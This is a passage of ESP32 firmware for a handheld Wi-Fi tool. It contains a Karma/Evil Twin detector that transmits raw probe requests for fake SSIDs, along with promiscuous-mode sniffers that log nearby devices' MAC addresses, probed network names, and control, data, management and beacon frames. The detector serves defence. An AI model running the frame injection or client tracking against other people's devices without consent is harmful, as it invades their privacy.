  probeReq[3] = 0x00;
  
  // Destination (broadcast)
  for (int i = 4; i < 10; i++) probeReq[i] = 0xFF;
  
  // Source (our MAC)
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_STA, mac);
  memcpy(&probeReq[10], mac, 6);
  
  // BSSID (broadcast)
  for (int i = 16; i < 22; i++) probeReq[i] = 0xFF;
  
  // Sequence number
  probeReq[22] = 0x00;
  probeReq[23] = 0x00;
  
  packetSize = 24;
  
  // SSID element
  probeReq[packetSize++] = 0x00;  // SSID tag
  probeReq[packetSize++] = randomSSID.length();
  memcpy(&probeReq[packetSize], randomSSID.c_str(), randomSSID.length());
  packetSize += randomSSID.length();
  
  // Supported rates
  probeReq[packetSize++] = 0x01;
  probeReq[packetSize++] = 0x08;
  probeReq[packetSize++] = 0x02;
  probeReq[packetSize++] = 0x04;
  probeReq[packetSize++] = 0x0B;
  probeReq[packetSize++] = 0x16;
  probeReq[packetSize++] = 0x0C;
  probeReq[packetSize++] = 0x12;
  probeReq[packetSize++] = 0x18;
  probeReq[packetSize++] = 0x24;
  
  // Send probe request
  esp_wifi_80211_tx(WIFI_IF_STA, probeReq, packetSize, false);
  
  Serial.printf("[TEST] Sent probe for fake SSID: %s\n", randomSSID.c_str());
}

// ==================== START KARMA DETECTOR ====================
void startKarmaDetector() {
  karmaDetectorActive = true;
  karmaAPCount = 0;
  karmaScrollOffset = 0;
  probeTestIndex = 0;
  
  // Clear test array
  for (int i = 0; i < 5; i++) {
    probeTests[i].randomSSID = "";
    probeTests[i].sentTime = 0;
    probeTests[i].gotResponse = false;
  }
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&karmaDetectorCallback);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  
  currentState = KARMA_DETECTOR;
  
  addToConsole("Karma detector started");
  Serial.println("[+] Karma/Evil Twin Detector started");
  Serial.println("    Sending probe tests for fake SSIDs...");
  
  displayKarmaDetector();
}

// ==================== STOP KARMA DETECTOR ====================
void stopKarmaDetector() {
  karmaDetectorActive = false;
  esp_wifi_set_promiscuous(false);
  
  Serial.printf("[+] Karma detector stopped - %d threats found\n", karmaAPCount);
  addToConsole("Karma detector stopped");
}

// ==================== DISPLAY KARMA DETECTOR ====================
void displayKarmaDetector() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("karma detector");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
  
  // Stats bar
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.print("Testing...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(100, statsY);
  tft.printf("APs:");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", karmaAPCount);
  
  // Count threats
  int threatCount = 0;
  for (int i = 0; i < karmaAPCount; i++) {
    if (karmaAPs[i].threatLevel >= 50) threatCount++;
  }
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(155, statsY);
  tft.printf("Threats:");
  tft.setTextColor(threatCount > 0 ? COLOR_RED : COLOR_GREEN);
  tft.printf("%d", threatCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setTextSize(1);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("NETWORK");
  tft.setCursor(130, listY);
  tft.print("THREAT");
  tft.setCursor(190, listY);
  tft.print("RESP");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  const int BACK_BUTTON_Y = 305;
  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25;
  const int ITEM_HEIGHT = 32;
  const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
  
  if (karmaAPCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, listY + 30);
    tft.print("✓ No Karma attacks detected");
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 50);
    tft.print("Testing with fake probes...");
    
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, listY + 70);
    tft.print("Looking for:");
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 5, listY + 85);
    tft.print("• Karma attacks");
    tft.setCursor(SIDE_MARGIN + 5, listY + 97);
    tft.print("• Evil Twin APs");
    tft.setCursor(SIDE_MARGIN + 5, listY + 109);
    tft.print("• Mass probe responses");
    
  } else {
    if (karmaScrollOffset >= karmaAPCount) {
      karmaScrollOffset = max(0, karmaAPCount - MAX_ITEMS);
    }
    if (karmaScrollOffset < 0) {
      karmaScrollOffset = 0;
    }
    
    int displayCount = min(karmaAPCount - karmaScrollOffset, MAX_ITEMS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = karmaScrollOffset + i;
      int y = listY + (i * ITEM_HEIGHT);
      
      if (y + ITEM_HEIGHT > SAFE_BOTTOM) break;
      
      KarmaAP* ap = &karmaAPs[idx];
      
      // Threat icon
      uint8_t threat = ap->threatLevel;
      uint16_t alertColor;
      if (threat >= 80) alertColor = COLOR_RED;
      else if (threat >= 50) alertColor = COLOR_ORANGE;
      else alertColor = COLOR_YELLOW;
      
      tft.setTextColor(alertColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y + 2);
      tft.print(threat >= 50 ? "[!]" : "[ ]");
      
      // SSID
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN + 18, y + 2);
      String displaySSID = ap->ssid;
      if (displaySSID.length() > 14) displaySSID = displaySSID.substring(0, 13) + "~";
      tft.print(displaySSID);
      
      // Threat level
      uint16_t threatColor;
      if (threat >= 80) threatColor = COLOR_RED;
      else if (threat >= 50) threatColor = COLOR_ORANGE;
      else if (threat >= 30) threatColor = COLOR_YELLOW;
      else threatColor = COLOR_GREEN;
      
      tft.setTextColor(threatColor);
      tft.setCursor(130, y + 2);
      tft.printf("%d%%", threat);
      
      // Response count
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(190, y + 2);
      tft.printf("%d", ap->probeResponseCount);
      
      // BSSID (line 2)
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 18, y + 12);
      tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
      
      // Threat reason (line 3)
      if (ap->threatReason.length() > 0) {
        tft.setTextColor(COLOR_ORANGE);
        tft.setCursor(SIDE_MARGIN + 18, y + 22);
        String reason = ap->threatReason;
        if (reason.length() > 25) reason = reason.substring(0, 24) + "~";
        tft.print(reason);
      }
      
      // Client indicator
      if (ap->hasClients) {
        tft.setTextColor(COLOR_RED);
        tft.setCursor(190, y + 22);
        tft.print("[CL]");
      }
    }
    
    if (karmaAPCount > MAX_ITEMS) {
      int scrollY = SAFE_BOTTOM + 2;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      
      int currentPage = (karmaScrollOffset / MAX_ITEMS) + 1;
      int totalPages = (karmaAPCount + MAX_ITEMS - 1) / MAX_ITEMS;
      char scrollText[30];
      sprintf(scrollText, "Page %d/%d [Tap]", currentPage, totalPages);
      int textWidth = strlen(scrollText) * 6;
      int centerX = (240 - textWidth) / 2;
      
      tft.setCursor(centerX, scrollY);
      tft.print(scrollText);
    }
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== HANDLE KARMA DETECTOR TOUCH ====================
void handleKarmaDetectorTouch(int x, int y) {
  if (y > 300) {
    stopKarmaDetector();
    currentState = MORE_TOOLS_MENU;
    hoveredIndex = -1;
    drawMoreToolsMenu();
    return;
  }
  
  // Scroll through results
  if (karmaAPCount > 0 && y > HEADER_HEIGHT + 40 && y < 280) {
    const int MAX_ITEMS = 7;
    int totalPages = (karmaAPCount + MAX_ITEMS - 1) / MAX_ITEMS;
    
    if (totalPages > 1) {
      int currentPage = karmaScrollOffset / MAX_ITEMS;
      currentPage = (currentPage + 1) % totalPages;
      karmaScrollOffset = currentPage * MAX_ITEMS;
      displayKarmaDetector();
    }
  }
}

// ==================== KARMA DETECTOR LOOP ====================
void updateKarmaDetector() {
  if (!karmaDetectorActive) return;
  
  static unsigned long lastProbeTest = 0;
  static unsigned long lastChannelHop = 0;
  static unsigned long lastDisplay = 0;
  static uint8_t currentChannel = 1;
  
  // Send probe test every 3 seconds
  if (millis() - lastProbeTest > 3000) {
    sendProbeTest();
    lastProbeTest = millis();
  }
  
  // Fast channel hopping (200ms per channel)
  if (millis() - lastChannelHop > 200) {
    currentChannel = (currentChannel % 13) + 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    lastChannelHop = millis();
  }
  
  // Update display every 500ms
  if (millis() - lastDisplay > 500) {
    displayKarmaDetector();
    lastDisplay = millis();
  }
}

void IRAM_ATTR controlSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  if (type != WIFI_PKT_CTRL) return;  // Only process control frames
  
  uint8_t frameType = pkt->payload[0];
  uint8_t frameSubtype = (frameType & 0xF0) >> 4;
  
  SAFE_INCREMENT(totalControlFrames);
  
  // Count frame types
  if (frameSubtype == 0x0B) {
    SAFE_INCREMENT(rtsFrames);
  } else if (frameSubtype == 0x0C) {
    SAFE_INCREMENT(ctsFrames);
  } else if (frameSubtype == 0x0D) {
    SAFE_INCREMENT(ackFrames);
  } else if (frameSubtype == 0x09) {
    SAFE_INCREMENT(blockAckFrames);
  }
  
  // Store frame details
  if (controlFrameCount < 50) {
    ControlFrame* frame = &controlFrames[controlFrameCount];
    
    // Extract MACs (varies by frame type)
    if (frameSubtype == 0x0B) {  // RTS
      memcpy(frame->sourceMAC, &pkt->payload[10], 6);
      memcpy(frame->destMAC, &pkt->payload[4], 6);
      frame->duration = pkt->payload[2] | (pkt->payload[3] << 8);
      frame->description = "RTS";
      frame->type = 0;
    } else if (frameSubtype == 0x0C) {  // CTS
      memcpy(frame->destMAC, &pkt->payload[4], 6);
      memset(frame->sourceMAC, 0, 6);
      frame->duration = pkt->payload[2] | (pkt->payload[3] << 8);
      frame->description = "CTS";
      frame->type = 1;
    } else if (frameSubtype == 0x0D) {  // ACK
      memcpy(frame->destMAC, &pkt->payload[4], 6);
      memset(frame->sourceMAC, 0, 6);
      frame->duration = pkt->payload[2] | (pkt->payload[3] << 8);
      frame->description = "ACK";
      frame->type = 2;
    } else if (frameSubtype == 0x09) {  // Block ACK
      memcpy(frame->sourceMAC, &pkt->payload[10], 6);
      memcpy(frame->destMAC, &pkt->payload[4], 6);
      frame->duration = pkt->payload[2] | (pkt->payload[3] << 8);
      frame->description = "BlockACK";
      frame->type = 3;
    }
    
    frame->rssi = pkt->rx_ctrl.rssi;
    frame->channel = pkt->rx_ctrl.channel;
    frame->timestamp = millis();
    
    controlFrameCount++;
  } else {
    controlFrameCount = 0;  // Circular buffer
  }
}

void IRAM_ATTR dataSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MISC) return;
  
  uint8_t frameType = pkt->payload[0];
  uint8_t frameSubtype = (frameType & 0xF0) >> 4;
  
  // Check if it's a data frame (type bits 2-3 should be 0b10)
  if ((frameType & 0x0C) != 0x08) return;
  
  SAFE_INCREMENT(totalDataFrames);
  
  // Count frame types
  if (frameSubtype == 0x08) {  // QoS Data
    SAFE_INCREMENT(qosDataFrames);
  } else if (frameSubtype == 0x04) {  // Null Data
    SAFE_INCREMENT(nullDataFrames);
  } else if (frameSubtype == 0x0C) {  // QoS Null
    SAFE_INCREMENT(qosNullFrames);
  } else if (frameSubtype == 0x05) {  // CF-ACK
    SAFE_INCREMENT(cfAckFrames);
  }
  
  // Store frame details
  if (dataFrameCount < 50) {
    DataFrame* frame = &dataFrames[dataFrameCount];
    
    // Extract addresses
    memcpy(frame->destMAC, &pkt->payload[4], 6);
    memcpy(frame->sourceMAC, &pkt->payload[10], 6);
    
    frame->rssi = pkt->rx_ctrl.rssi;
    frame->channel = pkt->rx_ctrl.channel;
    frame->timestamp = millis();
    frame->dataLen = pkt->rx_ctrl.sig_len - 24;  // Subtract header
    
    // Determine type and description
    if (frameSubtype == 0x08) {  // QoS Data
      frame->type = 1;
      frame->description = "QoS Data";
      // Extract QoS priority (if available)
      if (pkt->rx_ctrl.sig_len > 26) {
        frame->priority = (pkt->payload[24] & 0x0F);
      } else {
        frame->priority = 0;
      }
    } else if (frameSubtype == 0x04) {  // Null Data
      frame->type = 2;
      frame->description = "Null";
      frame->priority = 0;
      frame->dataLen = 0;
    } else if (frameSubtype == 0x0C) {  // QoS Null
      frame->type = 3;
      frame->description = "QoS Null";
      if (pkt->rx_ctrl.sig_len > 26) {
        frame->priority = (pkt->payload[24] & 0x0F);
      } else {
        frame->priority = 0;
      }
      frame->dataLen = 0;
    } else {  // Other data
      frame->type = 0;
      frame->description = "Data";
      frame->priority = 0;
    }
    
    dataFrameCount++;
  } else {
    dataFrameCount = 0;  // Circular buffer
  }
}

void startControlFrameSniffer() {
  controlSnifferActive = true;
  controlFrameCount = 0;
  totalControlFrames = 0;
  rtsFrames = 0;
  ctsFrames = 0;
  ackFrames = 0;
  blockAckFrames = 0;
  controlScrollOffset = 0;
  snifferChannel = 1;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&controlSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  addToConsole("Control sniffer started");
  Serial.println("[+] Control Frame Sniffer started - Fast hop");
  
  displayControlFrameSniffer();
}

void stopControlFrameSniffer() {
  controlSnifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Control sniffer stopped");
  Serial.printf("[+] Control sniffer stopped - %d frames\n", totalControlFrames);
}

void displayControlFrameSniffer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("control frame");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_ORANGE : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch%d", snifferChannel);
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(50, statsY);
  tft.printf("T:%d", totalControlFrames);
  
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(95, statsY);
  tft.printf("RTS:%d", rtsFrames);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(145, statsY);
  tft.printf("CTS:%d", ctsFrames);
  
  tft.setTextColor(COLOR_PURPLE);
  tft.setCursor(195, statsY);
  tft.printf("ACK:%d", ackFrames);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TYPE");
  tft.setCursor(50, listY);
  tft.print("SOURCE");
  tft.setCursor(115, listY);
  tft.print("DEST");
  tft.setCursor(180, listY);
  tft.print("DUR");
  tft.setCursor(210, listY);
  tft.print("PWR");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  const int FOOTER_Y = 270;
  const int ITEM_HEIGHT = 22;
  const int MAX_ITEMS = (FOOTER_Y - listY) / ITEM_HEIGHT;
  
  if (controlFrameCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("Waiting for control frames...");
  } else {
    int displayCount = min(controlFrameCount - controlScrollOffset, MAX_ITEMS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = controlFrameCount - 1 - controlScrollOffset - i;
      if (idx < 0) continue;
      
      int y = listY + (i * ITEM_HEIGHT);
      
      ControlFrame* frame = &controlFrames[idx];
      
      // Type with color
      uint16_t typeColor = COLOR_TEXT;
      if (frame->type == 0) typeColor = COLOR_GREEN;       // RTS
      else if (frame->type == 1) typeColor = COLOR_YELLOW; // CTS
      else if (frame->type == 2) typeColor = COLOR_PURPLE; // ACK
      else if (frame->type == 3) typeColor = COLOR_CYAN;   // BlockACK
      
      tft.setTextColor(typeColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y + 4);
      
      String typeStr = frame->description;
      if (typeStr.length() > 6) typeStr = typeStr.substring(0, 5) + "~";
      tft.print(typeStr);
      
      // Source MAC (last 3 octets, if available)
      if (frame->type == 0 || frame->type == 3) {  // RTS or BlockACK have source
        tft.setTextColor(COLOR_CYAN);
        tft.setCursor(50, y + 4);
        tft.printf("%02X:%02X:%02X", 
                   frame->sourceMAC[3], frame->sourceMAC[4], frame->sourceMAC[5]);
      } else {
        tft.setTextColor(COLOR_DARK_GREEN);
        tft.setCursor(50, y + 4);
        tft.print("---:--:--");
      }
      
      // Dest MAC (last 3 octets)
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(115, y + 4);
      tft.printf("%02X:%02X:%02X", 
                 frame->destMAC[3], frame->destMAC[4], frame->destMAC[5]);
      
      // Duration
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(180, y + 4);
      tft.printf("%3d", frame->duration);
      
      // RSSI
      tft.setTextColor(frame->rssi > -50 ? COLOR_GREEN : COLOR_RED);
      tft.setCursor(210, y + 4);
      tft.printf("%3d", frame->rssi);
    }
    
    if (controlFrameCount > MAX_ITEMS) {
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(80, FOOTER_Y);
      int currentPage = (controlScrollOffset / MAX_ITEMS) + 1;
      int totalPages = (controlFrameCount + MAX_ITEMS - 1) / MAX_ITEMS;
      tft.printf("Page %d/%d", currentPage, totalPages);
    }
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

void startDataFrameSniffer() {
  dataSnifferActive = true;
  dataFrameCount = 0;
  totalDataFrames = 0;
  qosDataFrames = 0;
  nullDataFrames = 0;
  cfAckFrames = 0;
  qosNullFrames = 0;
  dataScrollOffset = 0;
  snifferChannel = 1;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&dataSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  addToConsole("Data sniffer started");
  Serial.println("[+] Data Frame Sniffer started - QoS analysis");
  
  displayDataFrameSniffer();
}

void stopDataFrameSniffer() {
  dataSnifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Data sniffer stopped");
  Serial.printf("[+] Data sniffer stopped - %d frames\n", totalDataFrames);
}

void displayDataFrameSniffer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("data frame");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_CYAN : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch%d", snifferChannel);
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(50, statsY);
  tft.printf("Total:%d", totalDataFrames);
  
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(120, statsY);
  tft.printf("QoS:%d", qosDataFrames);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(175, statsY);
  tft.printf("Null:%d", nullDataFrames);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TYPE");
  tft.setCursor(55, listY);
  tft.print("SOURCE");
  tft.setCursor(120, listY);
  tft.print("DEST");
  tft.setCursor(185, listY);
  tft.print("PRI");
  tft.setCursor(210, listY);
  tft.print("LEN");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  const int FOOTER_Y = 270;
  const int ITEM_HEIGHT = 22;
  const int MAX_ITEMS = (FOOTER_Y - listY) / ITEM_HEIGHT;
  
  if (dataFrameCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("Waiting for data frames...");
    
    tft.setCursor(SIDE_MARGIN, listY + 55);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print("Capturing QoS traffic...");
  } else {
    int displayCount = min(dataFrameCount - dataScrollOffset, MAX_ITEMS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = dataFrameCount - 1 - dataScrollOffset - i;
      if (idx < 0) continue;
      
      int y = listY + (i * ITEM_HEIGHT);
      
      DataFrame* frame = &dataFrames[idx];
      
      // Type with color
      uint16_t typeColor = COLOR_TEXT;
      if (frame->type == 0) typeColor = COLOR_TEXT;       // Data
      else if (frame->type == 1) typeColor = COLOR_GREEN; // QoS Data
      else if (frame->type == 2) typeColor = COLOR_YELLOW; // Null
      else if (frame->type == 3) typeColor = COLOR_CYAN;  // QoS Null
      
      tft.setTextColor(typeColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y + 4);
      
      String typeStr = frame->description;
      if (typeStr.length() > 7) typeStr = typeStr.substring(0, 6) + "~";
      tft.print(typeStr);
      
      // Source MAC (last 3 octets)
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(55, y + 4);
      tft.printf("%02X:%02X:%02X", 
                 frame->sourceMAC[3], frame->sourceMAC[4], frame->sourceMAC[5]);
      
      // Dest MAC (last 3 octets)
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(120, y + 4);
      tft.printf("%02X:%02X:%02X", 
                 frame->destMAC[3], frame->destMAC[4], frame->destMAC[5]);
      
      // QoS Priority (0-7)
      if (frame->type == 1 || frame->type == 3) {  // QoS frames
        tft.setTextColor(COLOR_PURPLE);
        tft.setCursor(185, y + 4);
        tft.printf("%d", frame->priority);
      } else {
        tft.setTextColor(COLOR_DARK_GREEN);
        tft.setCursor(185, y + 4);
        tft.print("-");
      }
      
      // Data length
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(210, y + 4);
      if (frame->dataLen > 0) {
        tft.printf("%3d", frame->dataLen);
      } else {
        tft.print("  0");
      }
    }
    
    if (dataFrameCount > MAX_ITEMS) {
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(80, FOOTER_Y);
      int currentPage = (dataScrollOffset / MAX_ITEMS) + 1;
      int totalPages = (dataFrameCount + MAX_ITEMS - 1) / MAX_ITEMS;
      tft.printf("Page %d/%d", currentPage, totalPages);
    }
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== PROBE REQUEST SNIFFER CALLBACK ====================
void IRAM_ATTR probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  if (type != WIFI_PKT_MGMT) return;
  
  uint8_t frameType = pkt->payload[0];
  uint8_t frameSubtype = (frameType & 0xF0) >> 4;
  
  // Only process Probe Request frames (subtype 0x04)
  if (frameSubtype != 0x04) return;
  
  SAFE_INCREMENT(totalProbeRequests);
  
  // Extract client MAC (source address)
  uint8_t clientMAC[6];
  memcpy(clientMAC, &pkt->payload[10], 6);
  
  // Extract SSID from frame body
  int ssidLen = 0;
  String ssid = "";
  
  if (pkt->rx_ctrl.sig_len > 26) {
    // SSID starts at offset 26 (after management frame header)
    // Format: [Tag Number (0x00)][Length][SSID bytes...]
    if (pkt->payload[24] == 0x00) {
      ssidLen = pkt->payload[25];
      if (ssidLen > 0 && ssidLen <= 32 && (26 + ssidLen) < pkt->rx_ctrl.sig_len) {
        char ssidBuf[33] = {0};
        memcpy(ssidBuf, &pkt->payload[26], ssidLen);
        ssid = String(ssidBuf);
      }
    }
  }
  
  if (ssid.length() == 0) return; // Skip broadcast probes
  
  // Check if this client already exists
  bool found = false;
  for (int i = 0; i < probeRequestCount; i++) {
    if (memcmp(probeRequests[i].clientMAC, clientMAC, 6) == 0 && 
        probeRequests[i].ssid == ssid) {
      probeRequests[i].count++;
      probeRequests[i].timestamp = millis();
      probeRequests[i].rssi = pkt->rx_ctrl.rssi;
      found = true;
      break;
    }
  }
  
  // Add new probe request
  if (!found && probeRequestCount < 50) {
    ProbeRequest* pr = &probeRequests[probeRequestCount];
    memcpy(pr->clientMAC, clientMAC, 6);
    pr->ssid = ssid;
    pr->rssi = pkt->rx_ctrl.rssi;
    pr->channel = pkt->rx_ctrl.channel;
    pr->timestamp = millis();
    pr->count = 1;
    probeRequestCount++;
  }
}

// ==================== MANAGEMENT FRAME SNIFFER CALLBACK ====================
void IRAM_ATTR mgmtSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  if (type != WIFI_PKT_MGMT) return;
  
  uint8_t frameType = pkt->payload[0];
  uint8_t frameSubtype = (frameType & 0xF0) >> 4;
  
  SAFE_INCREMENT(totalMgmtFrames);
  
  // Count frame types
  if (frameSubtype == 0x0B) {
    SAFE_INCREMENT(authFrames);
  } else if (frameSubtype == 0x00 || frameSubtype == 0x01) {
    SAFE_INCREMENT(assocFrames);
  } else if (frameSubtype == 0x04 || frameSubtype == 0x05) {
    SAFE_INCREMENT(probeFrames);
  } else {
    SAFE_INCREMENT(otherMgmtFrames);
  }
  
  // Store frame details
  if (mgmtFrameCount < 50) {
    MgmtFrame* frame = &mgmtFrames[mgmtFrameCount];
    frame->type = frameType;
    frame->subtype = frameSubtype;
    memcpy(frame->sourcMAC, &pkt->payload[10], 6);
    memcpy(frame->destMAC, &pkt->payload[4], 6);
    frame->rssi = pkt->rx_ctrl.rssi;
    frame->channel = pkt->rx_ctrl.channel;
    frame->timestamp = millis();
    
    // Generate description
    switch (frameSubtype) {
      case 0x00: frame->description = "Assoc Req"; break;
      case 0x01: frame->description = "Assoc Resp"; break;
      case 0x02: frame->description = "Reassoc Req"; break;
      case 0x03: frame->description = "Reassoc Resp"; break;
      case 0x04: frame->description = "Probe Req"; break;
      case 0x05: frame->description = "Probe Resp"; break;
      case 0x08: frame->description = "Beacon"; break;
      case 0x0A: frame->description = "Disassoc"; break;
      case 0x0B: frame->description = "Auth"; break;
      case 0x0C: frame->description = "Deauth"; break;
      case 0x0D: frame->description = "Action"; break;
      default: frame->description = "Unknown"; break;
    }
    
    mgmtFrameCount++;
  } else {
    // Circular buffer
    mgmtFrameCount = 0;
  }
}

// ==================== BEACON ANALYZER CALLBACK ====================
void IRAM_ATTR beaconAnalyzerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  if (type != WIFI_PKT_MGMT) return;
  
  uint8_t frameType = pkt->payload[0];
  uint8_t frameSubtype = (frameType & 0xF0) >> 4;
  
  // Only process Beacon frames (subtype 0x08)
  if (frameSubtype != 0x08) return;
  
  SAFE_INCREMENT(totalBeacons);
  
  // Extract BSSID
  uint8_t bssid[6];
  memcpy(bssid, &pkt->payload[16], 6);
  
  // Check if beacon already exists
  int existingIndex = -1;
  for (int i = 0; i < beaconCount; i++) {
    if (memcmp(beacons[i].bssid, bssid, 6) == 0) {
      existingIndex = i;
      break;
    }
  }
  
  if (existingIndex >= 0) {
    // Update existing beacon
    beacons[existingIndex].beaconCount++;
    beacons[existingIndex].lastSeen = millis();
    beacons[existingIndex].rssi = pkt->rx_ctrl.rssi;
    return;
  }
  
  // Add new beacon
  if (beaconCount >= 30) return;
  
  BeaconInfo* beacon = &beacons[beaconCount];
  memcpy(beacon->bssid, bssid, 6);
  beacon->channel = pkt->rx_ctrl.channel;
  beacon->rssi = pkt->rx_ctrl.rssi;
  beacon->beaconCount = 1;
  beacon->firstSeen = millis();
  beacon->lastSeen = millis();
  
  // Parse beacon frame body (starts at offset 36)
  int offset = 36;
  
  // Extract capability info
  memcpy(beacon->capabilities, &pkt->payload[34], 2);
  
  // Parse Information Elements
  beacon->wpsEnabled = false;
  beacon->wmmEnabled = false;
  beacon->encryptionType = 0;
  beacon->numRates = 0;
  
  while (offset < pkt->rx_ctrl.sig_len - 2) {
    uint8_t tagNum = pkt->payload[offset];
    uint8_t tagLen = pkt->payload[offset + 1];
    
    if (tagLen == 0 || offset + 2 + tagLen > pkt->rx_ctrl.sig_len) break;
    
    switch (tagNum) {
      case 0x00: // SSID
        if (tagLen > 0 && tagLen <= 32) {
          char ssidBuf[33] = {0};
          memcpy(ssidBuf, &pkt->payload[offset + 2], tagLen);
          beacon->ssid = String(ssidBuf);
        }
        break;
        
